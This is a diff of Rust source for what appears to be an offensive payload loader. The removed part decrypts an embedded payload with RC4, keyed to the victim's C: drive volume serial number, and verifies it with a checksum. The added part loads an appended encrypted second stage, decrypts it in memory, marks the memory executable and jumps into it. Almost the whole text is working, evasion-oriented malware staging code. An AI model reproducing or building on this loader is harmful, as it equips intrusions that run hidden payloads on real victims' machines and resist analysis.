@@ -2,124 +2,62 @@
 #![no_main]
 
 #[panic_handler]
-fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }
-
-use core::{ptr::{null, null_mut}};
-use crystal_sdk::{import};
-use winapi::{shared::{minwindef::{DWORD, LPDWORD}, ntdef::{LONG, LPCSTR, LPSTR}}};
-
-#[derive(Default)]
-#[repr(C)]
-struct USTRING {
-    length: DWORD,
-    maxlen: DWORD,
-    buffer: *mut u8
+fn panic(_info: &core::panic::PanicInfo) -> ! {
+    loop {}
 }
 
-#[derive(Default)]
-#[repr(C)]
-struct ENVKEY {
-    a: DWORD,
-    b: DWORD,
+use core::{ffi::{c_void}, ptr::null_mut};
+use crystal_sdk::{append_data, get_resource, import, mem::memcpy};
+use winapi::{shared::{basetsd::SIZE_T, minwindef::{DWORD, LPVOID, PDWORD}}, um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, MEM_TOP_DOWN, PAGE_EXECUTE_READ, PAGE_READWRITE,},};
+
+append_data!(stage2, findAppendedS2, "__STAGE2__");
+
+import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
+import!(KERNEL32!VirtualFree(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD) -> i32);
+import!(KERNEL32!VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD) -> i32);
+
+unsafe extern "C" {
+    fn guardrail_decrypt(dst: *mut u8, len: i32, outlen: *mut i32) -> *const u8;
 }
 
-#[derive(Default)]
-#[repr(C)]
-struct _VERIFY {
-    check_sum: DWORD,
-    value: [u8; 0],
-}
+type FreeAndRun = unsafe extern "C" fn(loader_start: *const c_void);
 
-import!(ADVAPI32!SystemFunction033(data: *mut USTRING, key: *mut USTRING) -> LONG);
-import!(KERNEL32!GetVolumeInformationA(lpRootPathName: LPCSTR, lpVolumeNameBuffer: LPSTR, nVolumeNameSize: DWORD, lpVolumeSerialNumber: LPDWORD, 
-    lpMaximumComponentLength: LPDWORD, lpFileSystemFlags: LPDWORD, lpFileSystemNameBuffer: LPSTR, nFileSystemNameSize: DWORD) -> i32);
-
-fn checksum(buf: *const u8, len: DWORD) -> DWORD {
-    let mut a = 1u32;
-    let mut b = 0u32;
-
-    for x in 0..len as usize {
-        unsafe { a = (a + *buf.add(x) as u32) % 65521; }
-        b = (a + b) % 65521;
-    }
-
-    b.wrapping_shl(16) + a
-}
-
-fn derive_key_serial_no() -> ENVKEY {
-    unsafe {
-        let mut volume_serial_num = 0u32;
-
-        /* get the volume serial number and copy it to our key buffer */
-        GetVolumeInformationA(c"c:\\".as_ptr(), null_mut(), 0, &mut volume_serial_num, null_mut(), null_mut(), null_mut(), 0);
-
-        /* we're going through this gymnastic because rc4 wants at least 40b (5 bytes) to encrypt. */
-        let result = ENVKEY { 
-            a: volume_serial_num, 
-            b: volume_serial_num
-        };
-
-        result
-    }
-}
-
-/*
- * We are going to accept a buffer from the parent loader, to give the parent control over
- * how to allocate (and free) the memory for our decryption.
- *
- * char * dst    - the destination where our decrypted payload will live
- *                 (note: we expect this buffer is pre-populated with our ciphertext, we
- *                  decrypt in place)
- * int    len    - the length of our ciphertext. It better be <= the size of dst.
- * int  * outlen - a ptr to a var to populate with the size of the decrypted content.
- *                 This parameter is optional and a NULL value is OK.
- *
- * Returns a pointer to the decrypted VALUE if successful
- * Returns NULL if decryption or verification failed
- */
 #[unsafe(no_mangle)]
-extern "C" fn go(dst: *mut u8, len: i32, outlen: *mut i32) -> *const u8 {
+extern "C" fn go() {
     unsafe {
-        let mut key;
-        let mut u_data = USTRING::default();
-        let mut u_key = USTRING::default();
-        let hdr: *const _VERIFY;
-        let ddlen;
-        let ddsum;
+        let stage_2 = get_resource(findAppendedS2());
+        let buffer;
+        let mut old_prot = 0u32;
+        let data;
 
-        /* This is where we bring our environment-derived key into the mix.
-        * Here, we are using the c:\ drive's serial number as a simple key. */
-        key = derive_key_serial_no();
+        /* Allocate the memory for our decrypted stage 2. We are responsible for free()'ing this.
+         * We will free this value in run_stage2() */
+        buffer = VirtualAlloc(
+            null_mut(),
+            stage_2.len(),
+            MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
+            PAGE_READWRITE,
+        );
 
-        /* setup our USTRING data structures for RC4 decrypt */
-        u_data.length = len as _;
-        u_data.buffer = dst;
+        /* copy our (encrypted) stage 2 over to our RW working buffer, our guardrail PICO decrypts in place */
+        memcpy(buffer as _, stage_2.as_ptr(), stage_2.len());
 
-        u_key.length = size_of::<ENVKEY>() as _;
-        u_key.buffer = &mut key as *mut _ as _;
+        /* run our guardrail COFF to handle *everything* about the guardrail process. Note that the return
+         * value of this function is a SLICE into the buffer we passed in. It's not a new allocation. */
+        data = guardrail_decrypt(buffer as _, stage_2.len() as _, null_mut());
 
-        /* call the System033 function to do an RC4 decrypt */
-        SystemFunction033(&mut u_data, &mut u_key);
-
-        /* now, we need to *verify* our result. */
-        hdr = dst as _;
-
-        /* decrypted data length */
-        ddlen = len - size_of::<DWORD>() as i32;
-
-        /* store our output length too, if an outptr was provided */
-        if !outlen.is_null() {
-            *outlen = ddlen;
+        /*
+         * Guadrail decryption FAILED, do something else, or just exit.
+         */
+        if data.is_null() {
+            VirtualFree(buffer as _, 0, MEM_RELEASE);
+            return;
         }
 
-        /* checksum for our decrypted data */
-        ddsum = checksum((*hdr).value.as_ptr(), ddlen as _);
-
-        /* this succeeded if the packed-in and calculcated checksums match */
-        if (*hdr).check_sum == ddsum {
-            return (*hdr).value.as_ptr();
+        if VirtualProtect(buffer as _, stage_2.len(), PAGE_EXECUTE_READ, &mut old_prot) == 0 {
+            return;
         }
-        null()
-    }
-        
+
+        core::mem::transmute::<_, FreeAndRun>(data)(go as _);
+    };
 }
